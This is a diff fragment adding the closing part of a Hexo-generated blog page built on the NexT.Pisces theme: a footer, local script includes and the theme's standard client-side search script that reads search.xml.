+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy;  2016 - 
+  <span itemprop="copyrightYear">2017</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Jdrops</span>
+</div>
+
+
+<div class="powered-by">
+  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Pisces
+  </a>
+</div>
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.0"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.0"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.0"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.0"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length == 0) {
+      search_path = "search.xml";
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.popup').toggle();
+    }
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+      $.ajax({
+        url: path,
+        dataType: "xml",
+        async: true,
+        success: function( xmlResponse ) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = $( "entry", xmlResponse ).map(function() {
+            return {
+              title: $( "title", this ).text(),
+              content: $("content",this).text(),
+              url: $( "url" , this).text()
+            };
+          }).get();
+          var $input = document.getElementById(search_id);
+          var $resultContent = document.getElementById(content_id);
+          $input.addEventListener('input', function(){
+            var matchcounts = 0;
+            var str='<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length > 1) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var content_index = [];
+                var data_title = data.title.trim().toLowerCase();
+                var data_content = data.content.trim().replace(/<[^>]+>/g,"").toLowerCase();
+                var data_url = decodeURIComponent(data.url);
+                var index_title = -1;
+                var index_content = -1;
+                var first_occur = -1;
+                // only match artiles with not empty titles and contents
+                if(data_title != '') {
+                  keywords.forEach(function(keyword, i) {
+                    index_title = data_title.indexOf(keyword);
+                    index_content = data_content.indexOf(keyword);
+                    if( index_title >= 0 || index_content >= 0 ){
+                      isMatch = true;
+                      if (i == 0) {
+                        first_occur = index_content;
+                      }
+                    }
+
+                  });
+                }
+                // show search results
+                if (isMatch) {
+                  matchcounts += 1;
+                  str += "<li><a href='"+ data_url +"' class='search-result-title'>"+ data_title +"</a>";
+                  var content = data.content.trim().replace(/<[^>]+>/g,"");
+                  if (first_occur >= 0) {
+                    // cut out 100 characters
+                    var start = first_occur - 20;
+                    var end = first_occur + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if(start == 0){
+                      end = 50;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    var match_content = content.substring(start, end);
+                    // highlight all keywords
+                    keywords.forEach(function(keyword){
+                      var regS = new RegExp(keyword, "gi");
+                      match_content = match_content.replace(regS, "<b class=\"search-keyword\">"+keyword+"</b>");
+                    });
+
+                    str += "<p class=\"search-result\">" + match_content +"...</p>"
+                  }
+                  str += "</li>";
+                }
+              })};
+            str += "</ul>";
+            if (matchcounts == 0) { str = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>' }
+            if (keywords == "") { str = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>' }
+            $resultContent.innerHTML = str;
+          });
+          proceedsearch();
+        }
+      });}
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched == false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(function(e){
+      $('.popup').hide();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    });
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
